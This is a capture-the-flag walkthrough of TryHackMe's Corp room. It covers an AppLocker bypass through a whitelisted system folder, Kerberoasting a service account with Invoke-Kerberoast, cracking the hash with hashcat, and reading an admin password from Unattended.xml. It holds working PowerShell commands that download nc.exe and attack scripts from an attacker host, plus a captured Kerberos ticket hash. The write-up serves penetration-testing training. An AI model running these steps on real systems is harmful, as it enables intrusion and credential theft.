Bypass AppLocker whitelisting and capture Kerberos tickets to escalate attack. Technical walkthrough of completing Corp Room on the TryHackMe platform.


![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587397158220_image.png)

----------

Legal Usage: The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “ethical hacker” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.
By continued reading, you acknowledge the aforementioned user risks/responsibilities.

----------


# Bypassing Applocker

Applocker is a windows application used to whitelist programs that are allow on a specific user account. Further it allows users to only execute programs based on paths to include specific application publishers.


## bypass app locker

Bypass can occur by places executables within the directory:

    C:\Windows\System32\spool\drivers\color

Using powershell to download `nc`  executable to directory:

    powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.8.1.234:8000/nc.exe', 'C:\Windows\System32\spool\drivers\color\nc.exe')"

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587340674057_image.png)


`nc.exe` successfully executes within the folder bypassing the app locker.

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587341096001_image.png)


**Powershell history location:**

    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

Print contents of bash history:

    Get-Content -Path 'C:\Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587341853746_image.png)




# Kerberoasting

**Extract spn’s from windows** 

    setspn -T medin -Q */*

(output)

    PS C:\Windows\System32\spool\drivers\color> setspn -T medin -Q */*
    Ldap Error(0x51 -- Server Down): ldap_connect
    Failed to retrieve DN for domain "medin" : 0x00000051
    Warning: No valid targets specified, reverting to current domain.
    CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
            Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
            ldap/omega.corp.local/ForestDnsZones.corp.local
            ldap/omega.corp.local/DomainDnsZones.corp.local
            TERMSRV/OMEGA
            TERMSRV/omega.corp.local
            DNS/omega.corp.local
            GC/omega.corp.local/corp.local
            RestrictedKrbHost/omega.corp.local
            RestrictedKrbHost/OMEGA
            RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
            HOST/OMEGA/CORP
            HOST/omega.corp.local/CORP
            HOST/OMEGA
            HOST/omega.corp.local
            HOST/omega.corp.local/corp.local
            E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
            ldap/OMEGA/CORP
            ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
            ldap/omega.corp.local/CORP
            ldap/OMEGA
            ldap/omega.corp.local
            ldap/omega.corp.local/corp.local
    CN=krbtgt,CN=Users,DC=corp,DC=local
            kadmin/changepw
    CN=fela,CN=Users,DC=corp,DC=local
            HTTP/fela
            HOST/fela@corp.local
            HTTP/fela@corp.local
    
    Existing SPN found!


![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587342120144_image.png)


User enumeated to `CN=fela,CN=Users,DC=corp,DC=Local`


## Empire - Invoke-Kerberoast

Github link: [https://github.com/EmpireProject/Empire]()

Upload `Invoke-Kerberoast.ps1` to target:

    powershell -c "(new-object System.Net.WebClient).Downloadfile('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1', 'C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1')"

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587349766575_image.png)


Add line insdie Invoke-Kerberoast.ps1:

    Invoke-Kerberoast -OutputFormat hashcat

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587392936347_image.png)


**TGT Service Hash**
(needs to be one line)

    $krb5tgs$23$*fela$corp.local$HTTPfela*$BC1FE3E4CC81ABB946F6EB0AD7051687$1D5DC1EF47A761E0903C3F60606DD2675AD35B1EC6738C87C593F6CE477190988D4225D1ABE7616030E48380680535FE1CE3588F04ADECDBD332DD0B5108391E2161E4BBCE69AAF5708AF88DEBB7A0AB18DA31FC34EC6E1A40D25A25C21D51E82E3BBA11277774D8BCB7C54B94EC94F1E3C4106E2537122C77A4BB444C02DB0D01365C098662B6E416FB4620DC9EF83BA99B7F5A2C2F49687A19FD485115EAAA8A10E34042D93D407FB7D933A84A89068158F8450300010C118A90A89372C9BE36FA35350E434084517D2D0557C1AA30953066ACBE0E0122ADA8652540EA346F073E7D396BB45469DD8A8E7036DB806282A409EE6206F1226188E2716197594DB9E35C89414CF744B3D0AB3D30000D717936CCFA67CC3AF793FFFF15357845A6C3159B5AB35F36AE38BF4849C2FEE2E5963A8A39C9D32A1A5FF3425DCAA244FAB1D66C31D62E052095085A342337ADC6BD5CB928137C8B51A28809CC39F7BD59292B219FD05725F9352E493274448B9E91B847641775E642FF127954890FB3DC256508A9677BDDD56DA655FBB93574A0901258C45C4FC8C361A70C48CD907BCDA0381A2F64E1668CDEEF524C4CD8E77EE33650566496618404D186C7135C7041CC2C6DF3DBD2F7CD28234B2E12E3491E0E6D0604D769EECA46FB5B14B6720EF2709E2F4FDB762DC3DB9B7F36648F32C5A4E5FA21DDC970323053B037A274559B329CE46F8FE9A4A06D6E2833488D766DF1AEF8C593309F59CD8FB492F98F2B987656424DD116AC603D943AE680EA628B047F4CDD2E116BAE5CFB6F7757FF5926265712076D255CB7843C746698CA027D2F26823E7646953B4912D839741FCD82EDC0AE2AF31070994C713295C43D1D9098BEA2211E449C4E5012F51CB2743FF9603864050AE9BA5E21B09C1C7225CF8068F3351E8F26ECB4069ACAB198E97FE5CE98C18ECBA9700D6F1B40166DF254C8CFB9B02C4D19CAE2B7ECF2C30FD6A0654BE8939F83EB357B308827029A1FCC46A2DE0DE6E5171CF4E68E5574926CF550783E47ACDAC5CB67311C39C115C1B9E7AFFEDFE5BA0CED9085A882A3559506341C611EAA950443ACD64A05E2313ACE848685B981795A91EDC67FEA48DFD081D4D6B2E6909A3DF0C2762DEE766062AA39AC8AAF610BC8EE09E7D1D54E65BF3DCCD42530274F99CE37FC787DB1DA2282A12D248CF454DFA73FD54235A66132A2182E9ECD5C6A9100961E1EA57BF661E1721FD6F2DE02ECCD229C06D6DA73316A09847AAC3E0AA7C8E5D2A83CEB6EF20F057EB89C58A98C624D8DE8AD0B7637B9BCF42468F216A4204B8F112F2EEADDF1B5B498A05A2E23B55C3C1D60ADDC58C664045838CC158DAA5799518C635308267F9DB6DF842B39D294D603C5C2B7D6D951D3
    
![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587393732098_image.png)



## Crack Kerboeros 5 TGS Hash
    hashcat -m 13100 -a 0 extracted_hash /usr/share/wordlists/rockyou.txt --force

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587394472102_image.png)




## Login as User

started session with `xfreerdp`

    xfreerdp /u:'corp\fela' /v:46.137.142.191

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587394963912_image.png)




# Escalate Privileges with PowerUp.ps1

download to target:

    powershell -c "(new-object System.Net.WebClient).Downloadfile('https://10.8.1.234:8000/PowerUp.ps1', 'C:\Users\fela.CORP\Downloads\PowerUp.ps1')"

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587395648213_image.png)


(caught by AV in my case)

**Check Unattened.xml for cleartext passwords**

    type C:\Windows\Panther\Unattend\Unattended.xml

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587396023936_image.png)


*Password is Base64 encoded by default*


## Login as Administrator
    xfreerdp /u:'corp/administrator' /v:46.137.142.191

![](https://paper-attachments.dropbox.com/s_42ADE0FB3AFE4F69D5C36D91F62593B1F3824E00D29244723F0BD74A0CEE9226_1587396760179_image.png)


**Capture Flag**
located at `C:\Users\Administrator\Desktop\flag.txt`

